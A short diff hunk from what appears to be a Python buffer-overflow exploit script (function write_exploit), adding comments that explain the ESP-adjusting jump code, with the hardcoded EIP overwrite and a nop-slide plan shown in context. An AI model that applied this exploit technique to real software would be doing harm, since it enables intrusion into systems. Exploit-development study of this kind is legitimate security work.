@@ -39,6 +39,8 @@ def write_exploit():
     # only 50 bytes for shellcode
     shellcode_space = 50
     # increment ESP by 96 three times, puts you in the NOPs, then jmp ESP to ride nopslide to shellcode
+    # assembly is "add esp,0x60; add esp,0x60; add esp, 0x60; jmp esp"
+    # use windbg or RTA to discover opcodes for the assembly
     jumpcode = "\x83\xc4\x60\x83\xc4\x60\x83\xc4\x60\xff\xe4"
     eip = "\x3a\xf2\xaa\x01"
     # spacer to place jumpcode at esp
